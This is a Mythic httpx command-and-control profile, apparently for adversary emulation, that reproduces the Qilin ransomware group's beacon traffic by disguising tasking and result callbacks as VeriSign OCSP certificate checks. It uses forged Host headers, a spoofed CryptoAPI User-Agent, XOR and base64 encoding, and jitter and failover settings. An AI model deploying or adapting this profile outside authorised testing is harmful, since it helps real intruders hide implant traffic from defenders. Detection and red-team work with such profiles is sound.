# Mythic httpx profile - Qilin / Agenda OCSP-spoof beacon
#
# Reproduces Qilin's single most distinctive C2 signature: a Cobalt Strike Beacon over 443 with
# a forged Host header masquerading as certificate OCSP status checks. Emulation, not real
# malware. Source: The DFIR Report / Talos / Group-IB Qilin analyses. ATT&CK: T1071.001, T1573,
# T1001.003 (protocol impersonation), T1090.
#
# Documented indicators reproduced here:
#   - Host: ocsp.verisign.com  (traffic pretends to be OCSP cert-status lookups)
#   - OCSP-shaped requests: Microsoft-CryptoAPI User-Agent, application/ocsp-request content type
#   - (elsewhere in the intrusion, not in this profile): ScreenConnect on non-standard port 8880,
#     SystemBC/COROXY SOCKS, Chisel renamed 'fos'
#
# Why it is a good teaching target: real OCSP traffic comes from crypto/cert-validation clients to
# a real CA responder IP. This beacon's "OCSP" flows to an IP that is NOT a VeriSign/DigiCert
# responder, and often from a process that is not a browser or cert-check - both high-fidelity
# detections (see ../detections/elastic-sysmon.md).
#
# CAVEAT: validate against the current httpx schema/linter before building. httpx message
# locations are cookie/query/header/body (no uri-append), so the real OCSP "base64 request in the
# URL path" GET is approximated with a POST body carrying the OCSP-request content type, which is
# the cleaner and equally valid OCSP shape.

name = "qilin-ocsp"
callback_interval = 45
callback_jitter = 27
killdate = "2026-12-31"

callback_domains = ["https://ocsp.verisign.com"]
domain_rotation = "fail-over"
failover_threshold = 5

# ================================ GET (tasking pull) ================================
[get]
verb = "GET"
# Real Windows OCSP GET is /<base64-DER-request>; httpx has no uri-append, so we use a fixed
# OCSP-looking path plus a query-located message. Swap to the POST/OCSP body shape below if you
# want the most authentic content type.
uris = ["/ocsp"]

  [get.client]
  headers."User-Agent" = "Microsoft-CryptoAPI/10.0"
  headers."Host" = "ocsp.verisign.com"
  headers."Accept" = "application/ocsp-response"
  headers."Cache-Control" = "max-age=14400"

    [get.client.message]
    location = "query"
    name = "reqid"

    [[get.client.transforms]]
    action = "base64url"

  [get.server]
    [get.server.headers]
    "Content-Type" = "application/ocsp-response"
    "Server" = "nginx"
    "Cache-Control" = "public, max-age=14400"

    [[get.server.transforms]]
    action = "base64"
    [[get.server.transforms]]
    action = "xor"
    value = "0x51"   # single-byte XOR to look like opaque DER; swap for the source key if known

# ================================ POST (result callback, authentic OCSP shape) ============
[post]
verb = "POST"
uris = ["/"]

  [post.client]
  headers."User-Agent" = "Microsoft-CryptoAPI/10.0"
  headers."Host" = "ocsp.verisign.com"
  headers."Content-Type" = "application/ocsp-request"

    [post.client.message]
    location = "body"

    [[post.client.transforms]]
    action = "base64"

  [post.server]
    [post.server.headers]
    "Content-Type" = "application/ocsp-response"
    "Server" = "nginx"
